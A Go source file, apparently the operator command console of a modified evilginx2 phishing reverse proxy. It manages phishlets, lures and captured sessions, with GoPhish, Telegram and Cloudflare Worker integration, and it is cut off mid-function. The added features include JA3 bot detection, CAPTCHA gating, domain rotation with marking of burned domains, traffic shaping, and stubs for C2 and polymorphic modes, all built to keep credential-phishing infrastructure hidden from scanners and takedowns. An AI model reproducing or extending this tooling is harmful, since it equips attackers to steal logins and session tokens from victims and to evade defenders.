package core

import (
	"bufio"
	"crypto/rc4"
	"encoding/base64"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
	"github.com/kgretzky/evilginx2/parser"

	"github.com/chzyer/readline"
	"github.com/fatih/color"
)

const (
	DEFAULT_PROMPT = ": "
	LAYER_TOP      = 1
)

type Terminal struct {
	rl        *readline.Instance
	completer *readline.PrefixCompleter
	cfg       *Config
	crt_db    *CertDb
	p         *HttpProxy
	db        *database.Database
	hlp       *Help
	developer bool
}

func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Database, developer bool) (*Terminal, error) {
	var err error
	t := &Terminal{
		cfg:       cfg,
		crt_db:    crt_db,
		p:         p,
		db:        db,
		developer: developer,
	}

	t.createHelp()
	t.completer = t.hlp.GetPrefixCompleter(LAYER_TOP)

	t.rl, err = readline.NewEx(&readline.Config{
		Prompt:              DEFAULT_PROMPT,
		AutoComplete:        t.completer,
		InterruptPrompt:     "^C",
		EOFPrompt:           "exit",
		FuncFilterInputRune: t.filterInput,
	})
	if err != nil {
		return nil, err
	}
	return t, nil
}

func (t *Terminal) Close() {
	t.rl.Close()
}

func (t *Terminal) output(s string, args ...interface{}) {
	out := fmt.Sprintf(s, args...)
	fmt.Fprintf(color.Output, "\n%s\n", out)
}

func (t *Terminal) DoWork() {
	var do_quit = false

	t.checkStatus()
	log.SetReadline(t.rl)

	t.cfg.refreshActiveHostnames()
	t.manageCertificates(true)

	t.output("%s", t.sprintPhishletStatus(""))
	go t.monitorLurePause()

	for !do_quit {
		line, err := t.rl.Readline()
		if err == readline.ErrInterrupt {
			log.Info("type 'exit' in order to quit")
			continue
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)

		args, err := parser.Parse(line)
		if err != nil {
			log.Error("syntax error: %v", err)
		}

		argn := len(args)
		if argn == 0 {
			t.checkStatus()
			continue
		}

		cmd_ok := false
		switch args[0] {
		case "clear":
			cmd_ok = true
			readline.ClearScreen(color.Output)
		case "config":
			cmd_ok = true
			err := t.handleConfig(args[1:])
			if err != nil {
				log.Error("config: %v", err)
			}
		case "proxy":
			cmd_ok = true
			err := t.handleProxy(args[1:])
			if err != nil {
				log.Error("proxy: %v", err)
			}
		case "sessions":
			cmd_ok = true
			err := t.handleSessions(args[1:])
			if err != nil {
				log.Error("sessions: %v", err)
			}
		case "phishlets":
			cmd_ok = true
			err := t.handlePhishlets(args[1:])
			if err != nil {
				log.Error("phishlets: %v", err)
			}
		case "lures":
			cmd_ok = true
			err := t.handleLures(args[1:])
			if err != nil {
				log.Error("lures: %v", err)
			}
		case "cloudflare":
			cmd_ok = true
			err := t.handleCloudflare(args[1:])
			if err != nil {
				log.Error("cloudflare: %v", err)
			}
		case "blacklist":
			cmd_ok = true
			err := t.handleBlacklist(args[1:])
			if err != nil {
				log.Error("blacklist: %v", err)
			}
		case "whitelist":
			cmd_ok = true
			err := t.handleWhitelist(args[1:])
			if err != nil {
				log.Error("whitelist: %v", err)
			}
		case "ja3":
			cmd_ok = true
			err := t.handleJA3(args[1:])
			if err != nil {
				log.Error("ja3: %v", err)
			}
		case "captcha":
			cmd_ok = true
			err := t.handleCaptcha(args[1:])
			if err != nil {
				log.Error("captcha: %v", err)
			}
		case "domain-rotation":
			cmd_ok = true
			err := t.handleDomainRotation(args[1:])
			if err != nil {
				log.Error("domain-rotation: %v", err)
			}
		case "traffic-shaping":
			cmd_ok = true
			err := t.handleTrafficShaping(args[1:])
			if err != nil {
				log.Error("traffic-shaping: %v", err)
			}
		case "sandbox":
			cmd_ok = true
			err := t.handleSandbox(args[1:])
			if err != nil {
				log.Error("sandbox: %v", err)
			}
		case "c2":
			cmd_ok = true
			err := t.handleC2(args[1:])
			if err != nil {
				log.Error("c2: %v", err)
			}
		case "polymorphic":
			cmd_ok = true
			err := t.handlePolymorphic(args[1:])
			if err != nil {
				log.Error("polymorphic: %v", err)
			}
		case "test-certs":
			cmd_ok = true
			t.manageCertificates(true)
		case "help":
			cmd_ok = true
			if len(args) == 2 {
				if err := t.hlp.PrintBrief(args[1]); err != nil {
					log.Error("help: %v", err)
				}
			} else {
				t.hlp.Print(0)
			}
		case "q", "quit", "exit":
			do_quit = true
			cmd_ok = true
		default:
			log.Error("unknown command: %s", args[0])
			cmd_ok = true
		}
		if !cmd_ok {
			log.Error("invalid syntax: %s", line)
		}
		t.checkStatus()
	}
}

func (t *Terminal) handleConfig(args []string) error {
	pn := len(args)
	if pn == 0 {
		autocertOnOff := "off"
		if t.cfg.IsAutocertEnabled() {
			autocertOnOff = "on"
		}

		gophishInsecure := "false"
		if t.cfg.GetGoPhishInsecureTLS() {
			gophishInsecure = "true"
		}

		telegramEnabled := "false"
		if t.cfg.GetTelegramEnabled() {
			telegramEnabled = "true"
		}

		cfWorkerEnabled := "false"
		if t.cfg.IsCloudflareWorkerEnabled() {
			cfWorkerEnabled = "true"
		}
		
		lureStrategy := t.cfg.GetLureGenerationStrategy()

		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "lure_strategy", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, lureStrategy, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
		log.Printf("\n%s\n", AsRows(keys, vals))
		return nil
	} else if pn == 2 {
		switch args[0] {
		case "domain":
			t.cfg.SetBaseDomain(args[1])
			t.cfg.ResetAllSites()
			t.manageCertificates(false)
			return nil
		case "ipv4":
			t.cfg.SetServerExternalIP(args[1])
			return nil
		case "unauth_url":
			if len(args[1]) > 0 {
				_, err := url.ParseRequestURI(args[1])
				if err != nil {
					return err
				}
			}
			t.cfg.SetUnauthUrl(args[1])
			return nil
		case "autocert":
			switch args[1] {
			case "on":
				t.cfg.EnableAutocert(true)
				t.manageCertificates(true)
				return nil
			case "off":
				t.cfg.EnableAutocert(false)
				t.manageCertificates(true)
				return nil
			}
		case "lure_strategy":
			// Validate strategy
			validStrategies := []string{"short", "medium", "long", "realistic", "hex", "base64", "mixed"}
			isValid := false
			for _, s := range validStrategies {
				if s == args[1] {
					isValid = true
					break
				}
			}
			if !isValid {
				return fmt.Errorf("invalid lure strategy: %s (valid: short, medium, long, realistic, hex, base64, mixed)", args[1])
			}
			t.cfg.SetLureGenerationStrategy(args[1])
			return nil
		case "gophish":
			switch args[1] {
			case "test":
				t.p.gophish.Setup(t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), t.cfg.GetGoPhishInsecureTLS())
				err := t.p.gophish.Test()
				if err != nil {
					log.Error("gophish: %s", err)
				} else {
					log.Success("gophish: connection successful")
				}
				return nil
			}
		case "cloudflare_worker":
			// Handle 2-arg cloudflare_worker commands
			switch args[1] {
			case "test":
				// Test cloudflare worker configuration
				cfConfig := t.cfg.GetCloudflareWorkerConfig()
				if cfConfig.AccountID == "" || cfConfig.APIToken == "" {
					return fmt.Errorf("cloudflare worker account_id and api_token must be configured first")
				}
				api := NewCloudflareWorkerAPI(cfConfig.AccountID, cfConfig.APIToken, cfConfig.ZoneID)
				err := api.ValidateCredentials()
				if err != nil {
					log.Error("cloudflare worker: %s", err)
				} else {
					log.Success("cloudflare worker: credentials validated successfully")
				}
				return nil
			}
		case "telegram":
			switch args[1] {
			case "test":
				t.p.telegram.SetConfig(t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), true)
				err := t.p.telegram.SendTestMessage()
				if err != nil {
					log.Error("telegram: %s", err)
				} else {
					log.Success("telegram: test message sent successfully")
				}
				return nil
			}
		}
	} else if pn == 3 {
		switch args[0] {
		case "ipv4":
			switch args[1] {
			case "external":
				t.cfg.SetServerExternalIP(args[2])
				return nil
			case "bind":
				t.cfg.SetServerBindIP(args[2])
				return nil
			}
		case "gophish":
			switch args[1] {
			case "admin_url":
				t.cfg.SetGoPhishAdminUrl(args[2])
				return nil
			case "api_key":
				t.cfg.SetGoPhishApiKey(args[2])
				return nil
			case "insecure":
				switch args[2] {
				case "true":
					t.cfg.SetGoPhishInsecureTLS(true)
					return nil
				case "false":
					t.cfg.SetGoPhishInsecureTLS(false)
					return nil
				}
			}
		case "telegram":
			switch args[1] {
			case "bot_token":
				t.cfg.SetTelegramBotToken(args[2])
				// Update the proxy's telegram instance
				t.p.telegram.SetConfig(t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), t.cfg.GetTelegramEnabled())
				return nil
			case "chat_id":
				t.cfg.SetTelegramChatID(args[2])
				// Update the proxy's telegram instance
				t.p.telegram.SetConfig(t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), t.cfg.GetTelegramEnabled())
				return nil
			case "enabled":
				switch args[2] {
				case "true":
					t.cfg.SetTelegramEnabled(true)
					// Update and restart telegram bot if configured
					t.p.telegram.SetConfig(t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), true)
					t.p.telegram.Start()
					return nil
				case "false":
					t.cfg.SetTelegramEnabled(false)
					// Update the proxy's telegram instance
					t.p.telegram.SetConfig(t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), false)
					return nil
				}
			}
		case "cloudflare_worker":
			switch args[1] {
			case "account_id":
				t.cfg.SetCloudflareWorkerAccountID(args[2])
				return nil
			case "api_token":
				t.cfg.SetCloudflareWorkerAPIToken(args[2])
				return nil
			case "zone_id":
				t.cfg.SetCloudflareWorkerZoneID(args[2])
				return nil
			case "subdomain":
				t.cfg.SetCloudflareWorkerSubdomain(args[2])
				return nil
			case "enabled":
				switch args[2] {
				case "true":
					t.cfg.SetCloudflareWorkerEnabled(true)
					return nil
				case "false":
					t.cfg.SetCloudflareWorkerEnabled(false)
					return nil
				}
			case "test":
				// Test cloudflare worker configuration
				cfConfig := t.cfg.GetCloudflareWorkerConfig()
				if cfConfig.AccountID == "" || cfConfig.APIToken == "" {
					return fmt.Errorf("cloudflare worker account_id and api_token must be configured first")
				}
				api := NewCloudflareWorkerAPI(cfConfig.AccountID, cfConfig.APIToken, cfConfig.ZoneID)
				err := api.ValidateCredentials()
				if err != nil {
					log.Error("cloudflare worker: %s", err)
				} else {
					log.Success("cloudflare worker: credentials validated successfully")
				}
				return nil
			}
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handleBlacklist(args []string) error {
	pn := len(args)
	if pn == 0 {
		mode := t.cfg.GetBlacklistMode()
		ip_num, mask_num := t.p.bl.GetStats()
		log.Info("blacklist mode set to: %s", mode)
		log.Info("blacklist: loaded %d ip addresses and %d ip masks", ip_num, mask_num)

		return nil
	} else if pn == 1 {
		switch args[0] {
		case "all":
			t.cfg.SetBlacklistMode(args[0])
			return nil
		case "unauth":
			t.cfg.SetBlacklistMode(args[0])
			return nil
		case "noadd":
			t.cfg.SetBlacklistMode(args[0])
			return nil
		case "off":
			t.cfg.SetBlacklistMode(args[0])
			return nil
		}
	} else if pn == 2 {
		switch args[0] {
		case "log":
			switch args[1] {
			case "on":
				t.p.bl.SetVerbose(true)
				log.Info("blacklist log output: enabled")
				return nil
			case "off":
				t.p.bl.SetVerbose(false)
				log.Info("blacklist log output: disabled")
				return nil
			}
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handleWhitelist(args []string) error {
	pn := len(args)
	if pn == 0 {
		enabled := t.cfg.IsWhitelistEnabled()
		ip_num, mask_num := t.p.wl.GetStats()
		status := "disabled"
		if enabled {
			status = "enabled"
		}
		log.Info("whitelist: %s", status)
		log.Info("whitelist: loaded %d ip addresses and %d ip masks", ip_num, mask_num)
		
		if ip_num > 0 || mask_num > 0 {
			log.Info("whitelisted IPs:")
			for _, ip := range t.p.wl.GetAllIPs() {
				log.Info("  - %s", ip)
			}
		}

		return nil
	} else if pn == 1 {
		switch args[0] {
		case "on":
			t.cfg.SetWhitelistEnabled(true)
			t.p.wl.SetEnabled(true)
			return nil
		case "off":
			t.cfg.SetWhitelistEnabled(false)
			t.p.wl.SetEnabled(false)
			return nil
		case "clear":
			err := t.p.wl.Clear()
			if err != nil {
				return fmt.Errorf("failed to clear whitelist: %v", err)
			}
			log.Info("whitelist: cleared all ip addresses")
			return nil
		case "list":
			ips := t.p.wl.GetAllIPs()
			if len(ips) == 0 {
				log.Info("whitelist is empty")
			} else {
				log.Info("whitelisted IPs:")
				for _, ip := range ips {
					log.Info("  - %s", ip)
				}
			}
			return nil
		}
	} else if pn == 2 {
		switch args[0] {
		case "add":
			err := t.p.wl.AddIP(args[1])
			if err != nil {
				return fmt.Errorf("failed to add ip: %v", err)
			}
			log.Info("whitelist: added ip address: %s", args[1])
			return nil
		case "remove":
			err := t.p.wl.RemoveIP(args[1])
			if err != nil {
				return fmt.Errorf("failed to remove ip: %v", err)
			}
			log.Info("whitelist: removed ip address: %s", args[1])
			return nil
		case "log":
			switch args[1] {
			case "on":
				t.p.wl.SetVerbose(true)
				log.Info("whitelist log output: enabled")
				return nil
			case "off":
				t.p.wl.SetVerbose(false)
				log.Info("whitelist log output: disabled")
				return nil
			}
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handleJA3(args []string) error {
	pn := len(args)
	
	// No arguments - show basic stats
	if pn == 0 {
		if t.p.ja3Fingerprinter != nil {
			stats := t.p.ja3Fingerprinter.GetJA3Stats()
			log.Info("JA3/JA3S TLS Fingerprinting Statistics:")
			log.Info("  Total fingerprints captured: %d", stats["total_fingerprints"])
			log.Info("  Known bot signatures: %d", stats["known_bots"])
			log.Info("  Bot detections: %d", stats["bots_detected"])
			log.Info("  Cache size: %d", stats["cache_size"])
			log.Info("")
			log.Info("Use 'ja3 stats' for detailed statistics")
			log.Info("Use 'ja3 signatures' to list known bot signatures")
		} else {
			log.Error("JA3 fingerprinting not initialized")
		}
		return nil
	}
	
	// Handle subcommands
	switch args[0] {
	case "stats":
		if t.p.ja3Fingerprinter != nil {
			stats := t.p.ja3Fingerprinter.GetJA3Stats()
			log.Info("=== JA3/JA3S TLS Fingerprinting Statistics ===")
			log.Info("")
			log.Info("Capture Statistics:")
			log.Info("  Total fingerprints: %d", stats["total_fingerprints"])
			log.Info("  Unique JA3 hashes: %d", stats["cache_size"])
			log.Info("")
			log.Info("Detection Statistics:")
			log.Info("  Known bot signatures: %d", stats["known_bots"])
			log.Info("  Bot detections: %d", stats["bots_detected"])
			if total, ok := stats["total_fingerprints"].(int); ok && total > 0 {
				if bots, ok := stats["bots_detected"].(int); ok {
					percentage := float64(bots) * 100.0 / float64(total)
					log.Info("  Bot detection rate: %.1f%%", percentage)
				}
			}
		}
		return nil
		
	case "signatures":
		if t.p.ja3Fingerprinter != nil {
			signatures := t.p.ja3Fingerprinter.ExportSignatures()
			log.Info("=== Known Bot JA3 Signatures ===")
			log.Info("")
			log.Info("%-30s %-35s %-15s %s", "Bot Name", "JA3 Hash", "Confidence", "Description")
			log.Info("%s %s %s %s", strings.Repeat("-", 30), strings.Repeat("-", 35), strings.Repeat("-", 15), strings.Repeat("-", 40))
			
			for _, sig := range signatures {
				log.Info("%-30s %-35s %-15.0f%% %s", 
					sig.Name, 
					sig.JA3Hash, 
					sig.Confidence * 100,
					sig.Description)
			}
		}
		return nil
		
	case "add":
		if pn < 4 {
			return fmt.Errorf("syntax: ja3 add <name> <ja3_hash> <description>")
		}
		name := args[1]
		ja3Hash := args[2]
		description := strings.Join(args[3:], " ")
		
		if len(ja3Hash) != 32 {
			return fmt.Errorf("invalid JA3 hash length (must be 32 characters MD5 hash)")
		}
		
		if t.p.ja3Fingerprinter != nil {
			t.p.ja3Fingerprinter.AddCustomSignature(name, ja3Hash, description)
			log.Success("Added custom JA3 signature for: %s", name)
		}
		return nil
		
	case "export":
		if t.p.ja3Fingerprinter != nil {
			signatures := t.p.ja3Fingerprinter.ExportSignatures()
			
			// Convert to JSON
			output, err := json.MarshalIndent(signatures, "", "  ")
			if err != nil {
				return fmt.Errorf("failed to export signatures: %v", err)
			}
			
			// Write to file
			filename := fmt.Sprintf("ja3_signatures_%s.json", time.Now().Format("20060102_150405"))
			err = ioutil.WriteFile(filename, output, 0644)
			if err != nil {
				return fmt.Errorf("failed to write file: %v", err)
			}
			
			log.Success("Exported %d JA3 signatures to: %s", len(signatures), filename)
		}
		return nil
		
	default:
		return fmt.Errorf("unknown subcommand: %s", args[0])
	}
}

func (t *Terminal) handleCaptcha(args []string) error {
	pn := len(args)
	
	// No arguments - show current configuration
	if pn == 0 {
		if t.p.captchaManager != nil {
			stats := t.p.captchaManager.GetCaptchaStats()
			log.Info("CAPTCHA Configuration:")
			log.Info("  Enabled: %v", stats["enabled"])
			log.Info("  Active Provider: %s", stats["active_provider"])
			log.Info("  Configured Providers: %v", stats["configured_providers"])
			log.Info("  Require for Lures: %v", stats["require_for_lures"])
			log.Info("")
			log.Info("Use 'captcha enable on' to enable CAPTCHA protection")
			log.Info("Use 'captcha configure <provider> <site_key> <secret_key>' to configure a provider")
		} else {
			log.Error("CAPTCHA manager not initialized")
		}
		return nil
	}
	
	// Handle subcommands
	switch args[0] {
	case "enable":
		if pn < 2 {
			return fmt.Errorf("syntax: captcha enable <on|off>")
		}
		switch args[1] {
		case "on":
			t.cfg.SetCaptchaEnabled(true)
			log.Success("CAPTCHA protection enabled")
		case "off":
			t.cfg.SetCaptchaEnabled(false)
			log.Success("CAPTCHA protection disabled")
		default:
			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
		}
		return nil
		
	case "provider":
		if pn < 2 {
			return fmt.Errorf("syntax: captcha provider <name>")
		}
		providerName := args[1]
		if t.p.captchaManager != nil {
			err := t.p.captchaManager.SetActiveProvider(providerName)
			if err != nil {
				return err
			}
			t.cfg.SetCaptchaProvider(providerName)
			log.Success("Active CAPTCHA provider set to: %s", providerName)
		}
		return nil
		
	case "configure":
		if pn < 4 {
			return fmt.Errorf("syntax: captcha configure <provider> <site_key> <secret_key> [options]")
		}
		provider := args[1]
		siteKey := args[2]
		secretKey := args[3]
		
		// Parse options (key=value pairs)
		options := make(map[string]string)
		for i := 4; i < pn; i++ {
			parts := strings.SplitN(args[i], "=", 2)
			if len(parts) == 2 {
				options[parts[0]] = parts[1]
			}
		}
		
		// Configure the provider
		t.cfg.SetCaptchaProviderConfig(provider, siteKey, secretKey, options)
		
		// Reinitialize CAPTCHA manager with new config
		if t.p.captchaManager != nil {
			t.p.captchaManager = NewCaptchaManager(t.cfg.GetCaptchaConfig())
		}
		
		log.Success("CAPTCHA provider %s configured successfully", provider)
		log.Info("Options: %v", options)
		return nil
		
	case "require":
		if pn < 2 {
			return fmt.Errorf("syntax: captcha require <on|off>")
		}
		switch args[1] {
		case "on":
			t.cfg.SetCaptchaRequireForLures(true)
			log.Success("CAPTCHA verification required for all lures")
		case "off":
			t.cfg.SetCaptchaRequireForLures(false)
			log.Success("CAPTCHA verification optional for lures")
		default:
			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
		}
		return nil
		
	case "test":
		if t.p.captchaManager != nil && t.p.captchaManager.IsEnabled() {
			provider := t.p.captchaManager.GetActiveProvider()
			if provider != nil {
				log.Info("Opening CAPTCHA test page...")
				log.Info("Provider: %s", provider.GetName())
				log.Info("Navigate to: https://%s:%d/captcha-test", t.cfg.GetServerExternalIP(), t.cfg.GetHttpsPort())
			} else {
				log.Error("No active CAPTCHA provider configured")
			}
		} else {
			log.Error("CAPTCHA is not enabled")
		}
		return nil
		
	default:
		return fmt.Errorf("unknown subcommand: %s", args[0])
	}
}

func (t *Terminal) handleDomainRotation(args []string) error {
	pn := len(args)
	
	// No arguments - show current configuration
	if pn == 0 {
		if t.p.domainRotation != nil {
			stats := t.p.domainRotation.GetStats()
			log.Info("Domain Rotation Configuration:")
			log.Info("  Enabled: %v", stats["enabled"])
			log.Info("  Strategy: %s", stats["strategy"])
			log.Info("  Rotation Interval: %d minutes", t.cfg.GetDomainRotationConfig().RotationInterval)
			log.Info("  Max Domains: %d", stats["max_domains"])
			log.Info("  Auto Generate: %v", stats["auto_generate"])
			log.Info("  Active Domains: %d", stats["active_domains"])
			log.Info("  Healthy Domains: %d", stats["healthy_domains"])
			log.Info("")
			log.Info("Use 'domain-rotation enable on' to enable domain rotation")
			log.Info("Use 'domain-rotation add-domain' to add domains to rotation pool")
		} else {
			log.Info("Domain rotation not configured")
			log.Info("Use 'domain-rotation enable on' to enable")
		}
		return nil
	}
	
	// Handle subcommands
	switch args[0] {
	case "enable":
		if pn < 2 {
			return fmt.Errorf("syntax: domain-rotation enable <on|off>")
		}
		switch args[1] {
		case "on":
			t.cfg.SetDomainRotationEnabled(true)
			// Initialize if not already done
			if t.p.domainRotation == nil {
				t.p.domainRotation = NewDomainRotationManager(t.cfg.GetDomainRotationConfig(), t.p.crt_db)
			}
			t.p.domainRotation.Start()
			log.Success("Domain rotation enabled")
		case "off":
			t.cfg.SetDomainRotationEnabled(false)
			if t.p.domainRotation != nil {
				t.p.domainRotation.Stop()
			}
			log.Success("Domain rotation disabled")
		default:
			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
		}
		return nil
		
	case "strategy":
		if pn < 2 {
			return fmt.Errorf("syntax: domain-rotation strategy <type>")
		}
		strategy := args[1]
		if strategy != "round-robin" && strategy != "weighted" && strategy != "health-based" && strategy != "random" {
			return fmt.Errorf("invalid strategy: %s (use: round-robin, weighted, health-based, random)", strategy)
		}
		t.cfg.SetDomainRotationStrategy(strategy)
		log.Success("Domain rotation strategy set to: %s", strategy)
		return nil
		
	case "interval":
		if pn < 2 {
			return fmt.Errorf("syntax: domain-rotation interval <minutes>")
		}
		interval, err := strconv.Atoi(args[1])
		if err != nil || interval < 1 {
			return fmt.Errorf("invalid interval: %s (must be positive integer)", args[1])
		}
		t.cfg.SetDomainRotationInterval(interval)
		log.Success("Domain rotation interval set to: %d minutes", interval)
		return nil
		
	case "max-domains":
		if pn < 2 {
			return fmt.Errorf("syntax: domain-rotation max-domains <count>")
		}
		count, err := strconv.Atoi(args[1])
		if err != nil || count < 1 {
			return fmt.Errorf("invalid count: %s (must be positive integer)", args[1])
		}
		t.cfg.SetDomainRotationMaxDomains(count)
		log.Success("Maximum domains set to: %d", count)
		return nil
		
	case "auto-generate":
		if pn < 2 {
			return fmt.Errorf("syntax: domain-rotation auto-generate <on|off>")
		}
		switch args[1] {
		case "on":
			t.cfg.SetDomainRotationAutoGenerate(true)
			log.Success("Automatic domain generation enabled")
		case "off":
			t.cfg.SetDomainRotationAutoGenerate(false)
			log.Success("Automatic domain generation disabled")
		default:
			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
		}
		return nil
		
	case "add-domain":
		if pn < 4 {
			return fmt.Errorf("syntax: domain-rotation add-domain <domain> <subdomain> <provider>")
		}
		domain := args[1]
		subdomain := args[2]
		provider := args[3]
		
		if t.p.domainRotation == nil {
			return fmt.Errorf("domain rotation not initialized, enable it first")
		}
		
		err := t.p.domainRotation.AddDomain(domain, subdomain, provider)
		if err != nil {
			return err
		}
		log.Success("Domain %s.%s added to rotation pool", subdomain, domain)
		return nil
		
	case "remove-domain":
		if pn < 2 {
			return fmt.Errorf("syntax: domain-rotation remove-domain <full_domain>")
		}
		fullDomain := args[1]
		
		if t.p.domainRotation == nil {
			return fmt.Errorf("domain rotation not initialized")
		}
		
		err := t.p.domainRotation.RemoveDomain(fullDomain)
		if err != nil {
			return err
		}
		log.Success("Domain %s removed from rotation pool", fullDomain)
		return nil
		
	case "list":
		if t.p.domainRotation == nil {
			return fmt.Errorf("domain rotation not initialized")
		}
		
		domains := t.p.domainRotation.GetDomains()
		if len(domains) == 0 {
			log.Info("No domains in rotation pool")
			return nil
		}
		
		log.Info("=== Domains in Rotation Pool ===")
		log.Info("")
		log.Info("%-30s %-10s %-7s %-15s %-10s %s", "Domain", "Status", "Health", "Provider", "Requests", "Created")
		log.Info("%s %s %s %s %s %s", strings.Repeat("-", 30), strings.Repeat("-", 10), strings.Repeat("-", 7), strings.Repeat("-", 15), strings.Repeat("-", 10), strings.Repeat("-", 20))
		
		for _, rd := range domains {
			log.Info("%-30s %-10s %-7d %-15s %-10d %s",
				rd.FullDomain,
				rd.Status,
				rd.Health,
				rd.DNSProvider,
				rd.RequestCount,
				rd.CreatedAt.Format("2006-01-02 15:04:05"))
		}
		return nil
		
	case "add-provider":
		if pn < 6 {
			return fmt.Errorf("syntax: domain-rotation add-provider <name> <type> <api_key> <api_secret> <zone> [options]")
		}
		name := args[1]
		providerType := args[2]
		apiKey := args[3]
		apiSecret := args[4]
		zone := args[5]
		
		// Parse options
		options := make(map[string]string)
		for i := 6; i < pn; i++ {
			parts := strings.SplitN(args[i], "=", 2)
			if len(parts) == 2 {
				options[parts[0]] = parts[1]
			}
		}
		
		t.cfg.AddDomainRotationDNSProvider(name, providerType, apiKey, apiSecret, zone, options)
		log.Success("DNS provider %s added", name)
		return nil
		
	case "mark-compromised":
		if pn < 3 {
			return fmt.Errorf("syntax: domain-rotation mark-compromised <full_domain> <reason>")
		}
		fullDomain := args[1]
		reason := strings.Join(args[2:], " ")
		
		if t.p.domainRotation == nil {
			return fmt.Errorf("domain rotation not initialized")
		}
		
		err := t.p.domainRotation.MarkCompromised(fullDomain, reason)
		if err != nil {
			return err
		}
		log.Success("Domain %s marked as compromised", fullDomain)
		return nil
		
	case "stats":
		if t.p.domainRotation == nil {
			return fmt.Errorf("domain rotation not initialized")
		}
		
		stats := t.p.domainRotation.GetStats()
		log.Info("=== Domain Rotation Statistics ===")
		log.Info("")
		log.Info("System Status:")
		log.Info("  Enabled: %v", stats["enabled"])
		log.Info("  Strategy: %s", stats["strategy"])
		log.Info("  Total Rotations: %d", stats["total_rotations"])
		log.Info("  Last Rotation: %s", stats["last_rotation"])
		log.Info("")
		log.Info("Domain Status:")
		log.Info("  Active Domains: %d", stats["active_domains"])
		log.Info("  Healthy Domains: %d", stats["healthy_domains"])
		log.Info("  Compromised Count: %d", stats["compromised_count"])
		log.Info("  Max Domains: %d", stats["max_domains"])
		log.Info("")
		log.Info("Provider Statistics:")
		if providerStats, ok := stats["provider_stats"].(map[string]int); ok {
			for provider, count := range providerStats {
				log.Info("  %s: %d domains", provider, count)
			}
		}
		return nil
		
	default:
		return fmt.Errorf("unknown subcommand: %s", args[0])
	}
}

func (t *Terminal) handleTrafficShaping(args []string) error {
	pn := len(args)
	
	// No arguments - show current configuration
	if pn == 0 {
		if t.p.trafficShaper != nil {
			stats := t.p.trafficShaper.GetStats()
			log.Info("Traffic Shaping Configuration:")
			log.Info("  Enabled: %v", stats["enabled"])
			log.Info("  Mode: %s", stats["mode"])
			log.Info("  Active Limiters: %d", stats["active_limiters"])
			log.Info("  Total Requests: %d", stats["total_requests"])
			log.Info("  Allowed Requests: %d", stats["allowed_requests"])
			log.Info("  Rate Limited: %d", stats["rate_limited"])
			log.Info("")
			log.Info("Use 'traffic-shaping enable on' to enable traffic shaping")
			log.Info("Use 'traffic-shaping stats' for detailed statistics")
		} else {
			log.Info("Traffic shaping not configured")
			log.Info("Use 'traffic-shaping enable on' to enable")
		}
		return nil
	}
	
	// Handle subcommands
	switch args[0] {
	case "enable":
		if pn < 2 {
			return fmt.Errorf("syntax: traffic-shaping enable <on|off>")
		}
		switch args[1] {
		case "on":
			t.cfg.SetTrafficShapingEnabled(true)
			// Initialize if not already done
			if t.p.trafficShaper == nil {
				t.p.trafficShaper = NewTrafficShaper(t.cfg.GetTrafficShapingConfig())
			}
			t.p.trafficShaper.Start()
			log.Success("Traffic shaping enabled")
		case "off":
			t.cfg.SetTrafficShapingEnabled(false)
			if t.p.trafficShaper != nil {
				t.p.trafficShaper.Stop()
			}
			log.Success("Traffic shaping disabled")
		default:
			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
		}
		return nil
		
	case "mode":
		if pn < 2 {
			return fmt.Errorf("syntax: traffic-shaping mode <adaptive|strict|learning>")
		}
		mode := args[1]
		if mode != "adaptive" && mode != "strict" && mode != "learning" {
			return fmt.Errorf("invalid mode: %s (use: adaptive, strict, learning)", mode)
		}
		t.cfg.SetTrafficShapingMode(mode)
		log.Success("Traffic shaping mode set to: %s", mode)
		return nil
		
	case "global-limit":
		if pn < 3 {
			return fmt.Errorf("syntax: traffic-shaping global-limit <rate> <burst>")
		}
		rate, err := strconv.Atoi(args[1])
		if err != nil || rate < 1 {
			return fmt.Errorf("invalid rate: %s (must be positive integer)", args[1])
		}
		burst, err := strconv.Atoi(args[2])
		if err != nil || burst < 1 {
			return fmt.Errorf("invalid burst: %s (must be positive integer)", args[2])
		}
		t.cfg.SetTrafficShapingGlobalLimit(rate, burst)
		log.Success("Global rate limit set to: %d/s (burst: %d)", rate, burst)
		return nil
		
	case "ip-limit":
		if pn < 3 {
			return fmt.Errorf("syntax: traffic-shaping ip-limit <rate> <burst>")
		}
